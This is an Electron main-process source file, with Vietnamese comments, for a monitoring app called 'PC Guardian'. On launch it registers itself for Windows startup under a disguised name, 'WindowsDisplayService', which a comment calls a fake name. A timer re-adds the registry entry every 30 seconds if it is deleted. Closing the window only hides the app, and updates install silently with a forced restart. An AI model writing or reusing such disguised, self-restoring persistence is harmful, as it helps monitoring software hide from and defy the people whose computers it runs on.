const { app, BrowserWindow, Tray, Menu, nativeImage, dialog } = require('electron');
const path = require('path');
const { exec, spawn } = require('child_process');
const { autoUpdater } = require('electron-updater');
// Prevent multiple instances
const gotTheLock = app.requestSingleInstanceLock();
if (!gotTheLock) {
  app.quit();
}

// Start the Express server
let server;
const PORT = 3847;

function startServer() {
  try {
    // Set the working directory to the app path
    process.chdir(app.isPackaged ? path.dirname(process.execPath) : __dirname);
    
    // Override data directory for packaged app
    const userDataPath = app.getPath('userData');
    process.env.PCG_DATA_DIR = path.join(userDataPath, 'data');
    
    server = require('./server-headless');
    return true;
  } catch (err) {
    console.error('Failed to start server:', err);
    return false;
  }
}

let mainWindow = null;
let tray = null;
let isQuitting = false;

/**
 * Thêm vào Windows Startup - tự chạy khi bật máy
 */
function addToWindowsStartup() {
  const exePath = process.execPath;
  const appName = 'WindowsDisplayService'; // Tên giả trang
  const regKey = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run';
  
  exec(`reg add "${regKey}" /v "${appName}" /t REG_SZ /d "\\"${exePath}\\"" /f`, (err) => {
    if (!err) {
      console.log('[PC Guardian] Added to Windows Startup');
    }
  });
}

/**
 * Xóa khỏi Windows Startup
 */
function removeFromWindowsStartup() {
  const appName = 'WindowsDisplayService';
  const regKey = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run';
  exec(`reg delete "${regKey}" /v "${appName}" /f`, () => {});
}

/**
 * Kiểm tra và bảo vệ startup key
 */
function protectStartupKey() {
  const appName = 'WindowsDisplayService';
  const regKey = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run';
  
  exec(`reg query "${regKey}" /v "${appName}"`, (err) => {
    if (err) {
      // Key bị xóa, thêm lại
      addToWindowsStartup();
    }
  });
}

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 1280,
    height: 800,
    minWidth: 900,
    minHeight: 600,
    title: 'PC Guardian',
    icon: path.join(__dirname, 'assets', 'icon.png'),
    backgroundColor: '#060918',
    autoHideMenuBar: true,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true
    },
    show: false // Don't show until ready
  });

  // Load the dashboard
  mainWindow.loadURL(`http://localhost:${PORT}/login.html`);

  // Show when ready
  mainWindow.once('ready-to-show', () => {
    mainWindow.show();
  });

  // Minimize to tray instead of closing
  mainWindow.on('close', (event) => {
    if (!isQuitting) {
      event.preventDefault();
      mainWindow.hide();
      
      // Show tray notification first time
      if (tray) {
        tray.displayBalloon({
          title: 'PC Guardian',
          content: 'Ứng dụng đang chạy ẩn. Click đúp vào icon để mở lại.',
          iconType: 'info'
        });
      }
    }
  });

  mainWindow.on('closed', () => {
    mainWindow = null;
  });
}

function createTray() {
  // Create a simple tray icon
  const iconPath = path.join(__dirname, 'assets', 'tray-icon.png');
  let trayIcon;
  
  try {
    trayIcon = nativeImage.createFromPath(iconPath);
    if (trayIcon.isEmpty()) throw new Error('Icon empty');
  } catch {
    // Create a basic 16x16 icon if file doesn't exist
    trayIcon = nativeImage.createEmpty();
  }

  tray = new Tray(trayIcon);
  tray.setToolTip('PC Guardian - Đang giám sát');

  const contextMenu = Menu.buildFromTemplate([
    {
      label: '🛡️ PC Guardian',
      enabled: false
    },
    { type: 'separator' },
    {
      label: '📊 Mở Dashboard',
      click: () => {
        if (mainWindow) {
          mainWindow.show();
          mainWindow.focus();
        }
      }
    },
    {
      label: '🔄 Trạng thái: Đang giám sát',
      id: 'status',
      enabled: false
    },
    { type: 'separator' },
    {
      label: '🛡️ Bảo vệ đang bật',
      enabled: false
    }
  ]);

  tray.setContextMenu(contextMenu);

  // Double click to show window
  tray.on('double-click', () => {
    if (mainWindow) {
      mainWindow.show();
      mainWindow.focus();
    }
  });
}

// App lifecycle
app.whenReady().then(() => {
  // Start the backend server first
  const started = startServer();
  
  if (!started) {
    dialog.showErrorBox('PC Guardian', 'Không thể khởi động server. Vui lòng kiểm tra lại.');
    app.quit();
    return;
  }

  // Add to Windows Startup automatically
  addToWindowsStartup();

  // Protect startup key every 30 seconds
  setInterval(protectStartupKey, 30000);

  // Wait a bit for server to start, then create window
  setTimeout(() => {
    createTray();
    createWindow();

    // Auto-update check
    autoUpdater.checkForUpdatesAndNotify();

    autoUpdater.on('update-downloaded', (info) => {
      if (tray) {
        tray.displayBalloon({
          title: 'PC Guardian Cập Nhật',
          content: 'Đã tải xong bản nâng cấp mới. Phần mềm sẽ khởi động lại trong 5 giây...',
          iconType: 'info'
        });
      }
      setTimeout(() => {
        // isSilent: true (không hiện cửa sổ cài), isForceRunAfter: true (khởi động lại app sau khi cài)
        autoUpdater.quitAndInstall(true, true);
      }, 5000);
    });
  }, 1000);
});

// Handle second instance - show existing window
app.on('second-instance', () => {
  if (mainWindow) {
    if (mainWindow.isMinimized()) mainWindow.restore();
    mainWindow.show();
    mainWindow.focus();
  }
});

app.on('window-all-closed', () => {
  // Don't quit on window close - keep running in tray
});

app.on('before-quit', () => {
  isQuitting = true;
});

app.on('activate', () => {
  if (mainWindow === null) {
    createWindow();
  }
});

